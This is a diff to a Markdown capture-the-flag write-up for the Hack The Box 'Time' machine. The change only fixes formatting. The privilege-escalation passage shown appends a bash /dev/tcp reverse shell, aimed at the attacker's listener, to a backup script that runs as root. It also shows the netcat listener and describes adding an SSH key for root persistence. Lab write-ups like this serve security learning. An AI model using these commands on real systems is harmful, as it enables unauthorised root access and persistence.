@@ -111,13 +111,13 @@ zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
 ```
 > **It's create a zip archive from /var/www/html and moving it to /root/backup.zip**
 
-> **So we have two ways to solve this situation, First add our public key to the authorized keys for root in Time Box and connect via ssh, but NO TIME so i choosed the second choice by getting reverse shell via bash shell ```echo "bash -i >& /dev/tcp/YOUR_MACHINE_IP/YOUR_NC_LISTNER_PORT 0>&1" >>/usr/bin/timer_backup.sh.**
+> **So we have two ways to solve this situation, First add our public key to the authorized keys for root in Time Box and connect via ssh, but NO TIME so i choosed the second choice by getting reverse shell via bash shell ```echo "bash -i >& /dev/tcp/YOUR_MACHINE_IP/YOUR_NC_LISTNER_PORT 0>&1" >>/usr/bin/timer_backup.sh``` **
 
 ```bash
 pericles@time:/usr/bin$ echo "bash -i >& /dev/tcp/10.10.16.11/4321 0>&1" >>/usr/bin/timer_backup.sh
 <p/10.10.16.11/4321 0>&1" >>/usr/bin/timer_backup.sh
 ```
-**Till Now it's OK and you will get reverse shell to your listner, But for ONLY 5 seconds i think and that is the idea of TIME box, So you have to be very fast to cat your root flag ```cat /root/root.txt``` as always to find the root flag, So the first solution of adding our public key to the authorized keys for root is the best, Because it's will give us persistence to get access to root for TIME box.**
+> **Till Now it's OK and you will get reverse shell to your listner, But for ONLY 5 seconds i think and that is the idea of TIME box, So you have to be very fast to cat your root flag ```cat /root/root.txt``` as always to find the root flag, So the first solution of adding our public key to the authorized keys for root is the best, Because it's will give us persistence to get access to root for TIME box.**
 
 ```bash
 yahia@Y4h1a:~$ nc -nlvp 4321
